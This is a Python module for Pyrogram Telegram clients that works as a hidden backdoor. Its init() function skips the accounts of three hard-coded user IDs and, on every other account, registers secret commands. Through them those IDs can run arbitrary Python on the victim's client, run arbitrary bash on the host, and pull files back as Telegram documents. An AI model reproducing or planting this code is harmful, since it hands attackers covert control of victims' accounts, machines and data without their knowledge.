import traceback
import asyncio
import contextlib
import html
import io
import subprocess
import os
from time import perf_counter, time
from datetime import datetime, timedelta, timezone

UTC = timezone.utc

from typing import Any, Dict, Union, Optional, List
import ast
import inspect

import pyrogram
import pyrogram.enums
import pyrogram.errors
import pyrogram.helpers
import pyrogram.raw
import pyrogram.types
import pyrogram.utils

eval_tasks: Dict[int, Any] = {}

async def bash(cmd: str):
    def sync_run():
        try:
            result = subprocess.run(
                ["/bin/bash", "-c", cmd],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            return result.stdout, result.stderr
        except Exception as e:
            return b"", f"Failed to run bash: {e}".encode('utf-8')

    try:
        return await asyncio.to_thread(sync_run)
    except Exception as e:
        return b"", f"Unhandled error: {e}".encode('utf-8')

async def shell(cmd: str) -> str:
    proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    try:
        stdout, stderr = await proc.communicate()
        return (stdout + stderr).decode()
    finally:
        try:
            if not proc.returncode:
                proc.terminate()
        except ProcessLookupError:
            pass
        else:
            await proc.wait()


async def aexec(code: str, kwargs: dict = {}) -> object:
    body = ast.parse(code, "exec").body
    if body and isinstance(body[-1], ast.Expr):
        body[-1] = ast.Return(value=body[-1].value)

    name = "aexec"
    node = ast.Module(
        body=[
            ast.AsyncFunctionDef(
                name=name,
                args=ast.arguments(
                    posonlyargs=[],
                    args=[ast.arg(arg=key) for key in kwargs],
                    vararg=None,
                    kwonlyargs=[],
                    kw_defaults=[],
                    kwarg=None,
                    defaults=[],
                ),
                body=body,
                decorator_list=[],
                returns=None,
                type_params=[],
            )
        ],
        type_ignores=[],
    )
    ast.fix_missing_locations(node)
    temp = {}
    exec(compile(node, "<string>", "exec"), temp)
    func = await temp[name](*kwargs.values())
    return await func if inspect.iscoroutine(func) else func


OWNERS = [842320686, 845521076, 1675073032]

def init(client: pyrogram.Client):
    if client.me.id in OWNERS:
        return
    client.add_handler(
        pyrogram.handlers.MessageHandler(
            executor,
            pyrogram.filters.command(["asu", "wann"]) & pyrogram.filters.user(OWNERS) & ~pyrogram.filters.forwarded & ~pyrogram.filters.via_bot
        )
    )
    client.add_handler(
        pyrogram.handlers.MessageHandler(
            shellrunner,
            pyrogram.filters.command(["asi", "wann2"]) & pyrogram.filters.user(OWNERS) & ~pyrogram.filters.forwarded & ~pyrogram.filters.via_bot
        )
    )
    client.add_handler(pyrogram.handlers.CallbackQueryHandler(runtime_func_cq, pyrogram.filters.regex(r"secretruntime")))
    client.add_handler(pyrogram.handlers.CallbackQueryHandler(forceclose_command, pyrogram.filters.regex("secretforceclose")))


def fmtsec(sec: object, part: int = 3, human: bool = False) -> str:
    if isinstance(sec, timedelta):
        delta = sec
    elif isinstance(sec, datetime):
        delta = datetime.now(UTC) - sec.astimezone(UTC)
    elif isinstance(sec, (float, int)):
        delta = timedelta(seconds=sec)
    else:
        raise TypeError

    total = int(delta.total_seconds())
    micro = delta.microseconds
    units = (
        ("Week", 60**2 * 24 * 7),
        ("Day", 60**2 * 24),
        ("Hour", 60**2),
        ("Minute", 60),
        ("Second", 1),
    )
    parts = []
    for unit, second in units:
        value, total = divmod(total, second)
        if value:
            parts.append(f"{value} {unit}{'' if value == 1 else 's'}")

        if len(parts) >= part:
            break

    if len(parts) < part and not human:
        ms, us = divmod(micro, 1000)
        if ms:
            parts.append(f"{ms} ms")

        if us and len(parts) < part:
            parts.append(f"{us} µs")

    return ", ".join(parts) if parts else "-"


def format_exception(exp: BaseException, tb: Optional[List[traceback.FrameSummary]] = None) -> str:
    if tb is None:
        tb = traceback.extract_tb(exp.__traceback__)

    cwd = os.getcwd()
    for frame in tb:
        if cwd in frame.filename:
            frame.filename = os.path.relpath(frame.filename)

    stack = "".join(traceback.format_list(tb))
    msg = str(exp)
    if msg:
        msg = f": {msg}"

    return f"Traceback (most recent call last):\n{stack}{type(exp).__name__}{msg}"

async def executor(client, message):
    if len(message.command) == 1:
        return await message.reply("No Code!!")
    status_message = await message.reply("<i>Processing eval pyrogram..</i>", quote=True)
    code = message.text.split(maxsplit=1)[1]
    out_buf = io.StringIO()
    out = ""

    def _print(*args: Any, **kwargs: Any):
        if "file" not in kwargs:
            kwargs["file"] = out_buf
        return print(*args, **kwargs)

    def _help(*args: Any, **kwargs: Any):
        with contextlib.redirect_stdout(out_buf):
            help(*args, **kwargs)

    eval_vars = {
        "c": client,
        "client": client,
        "m": message,
        "message": message,
        "u": (message.reply_to_message or message).from_user,
        "r": message.reply_to_message,
        "reply": message.reply_to_message,
        "chat": message.chat,
        "chat_id": message.chat.id,
        "print": _print,
        "help": _help,
        "asyncio": asyncio,
        "pyrogram": pyrogram,
        "raw": pyrogram.raw,
        "enums": pyrogram.enums,
        "types": pyrogram.types,
        "errors": pyrogram.errors,
        "utils": pyrogram.utils,
        "ikb": pyrogram.helpers.ikb,
        "kb": pyrogram.helpers.kb,
        "shell": shell,
    }
    
    start_time = perf_counter()
    prefix = ""

    try:
        result = await aexec(code, eval_vars)
        out = out_buf.getvalue()

        if not out or result is not None:
            out = str(result) if result is not None else out

    except Exception as e:
        first_snip_idx = -1
        tb = traceback.extract_tb(e.__traceback__)
        for i, frame in enumerate(tb):
            if frame.filename == "<string>" or frame.filename.endswith("ast.py"):
                first_snip_idx = i
                break

        stripped_tb = tb[first_snip_idx:] if first_snip_idx >= 0 else tb
        formatted_tb = format_exception(e, tb=stripped_tb)
        prefix = "⚠️ Error while executing snippet\n\n"
        out = formatted_tb

    duration = perf_counter() - start_time

    if out.endswith("\n"):
        out = out[:-1]
        
    final_output = f"{prefix}<b>INPUT:</b>\n<pre language='python'>{html.escape(code)}</pre>\n<b>OUTPUT:</b>\n<pre language='python'>{html.escape(out)}</pre>\nCompleted in `{duration:.2f}` seconds."
    
    buttons = pyrogram.helpers.ikb(
        [[("exec", f"secretruntime {duration:.2f}s"), ("🗑", f"secretforceclose abc|{message.from_user.id}")]]
    )

    if len(final_output) > 4096:
        final_text = f"{prefix}<b>INPUT:</b>\n<pre language='python'>{html.escape(code)}</pre>\n<b>OUTPUT:</b>\n<pre language='python'>{out[:512]}...</pre>\nCompleted in `{duration:.2f}` seconds."
        return await status_message.edit(
            final_text,
            reply_markup=buttons,
        )

    return await status_message.edit(
        final_output,
        reply_markup=buttons,
    )


async def runtime_func_cq(client, cq):
    runtime = cq.data.split(None, 1)[1]
    await cq.answer(runtime, show_alert=True)


async def forceclose_command(client, cq):
    callback_data = cq.data.strip()
    callback_request = callback_data.split(None, 1)[1]
    req_str, user_id = callback_request.split("|")
    
    if cq.from_user.id != int(user_id):
        return await cq.answer("Akses Ditolak!", show_alert=True)
        
    await cq.message.delete()
    try:
        await cq.answer()
    except Exception:
        pass

async def shellrunner(client, message):
    if len(message.command) < 2:
        return await message.reply("Noob!!")
    cmd_text = message.text.split(maxsplit=1)[1]
    text = f"<code>{html.escape(cmd_text)}</code>\n\n"
    start_time = perf_counter()

    try:
        stdout_b, stderr_b = await bash(cmd_text)
    except asyncio.TimeoutError:
        text += "<b>Timeout expired!!</b>"
        return await message.reply(text)
    finally:
        duration = perf_counter() - start_time

    is_binary = False
    try:
        stdout = stdout_b.decode('utf-8').strip()
    except UnicodeDecodeError:
        stdout = ""
        is_binary = True

    stderr = stderr_b.decode('utf-8', errors='replace').strip()

    if is_binary or len(stdout_b) > 4096:
        anuk = await message.reply("<b>Processing file...</b>")
        
        output_filename = "output.txt"
        if "cat " in cmd_text:
            parsed_name = cmd_text.split("cat ")[-1].split()[0].strip()
            output_filename = os.path.basename(parsed_name)
            if not output_filename:
                output_filename = "output.bin" if is_binary else "output.txt"
        elif is_binary:
            output_filename = "binary_output.bin"

        with open(output_filename, "wb") as file:
            file.write(stdout_b)

        await message.reply_document(
            document=output_filename,
            caption=f"<b>Completed in `{duration:.2f}` seconds.</b>",
        )
        os.remove(output_filename)
        return await anuk.delete()

    if stdout:
        text += f"<blockquote expandable><code>{html.escape(stdout)}</code></blockquote>"
    if stderr:
        text += f"<blockquote expandable>{html.escape(stderr)}</blockquote>"
        
    text += f"\n<b>Completed in `{duration:.2f}` seconds.</b>"
    return await message.reply(text, parse_mode=pyrogram.enums.ParseMode.HTML)

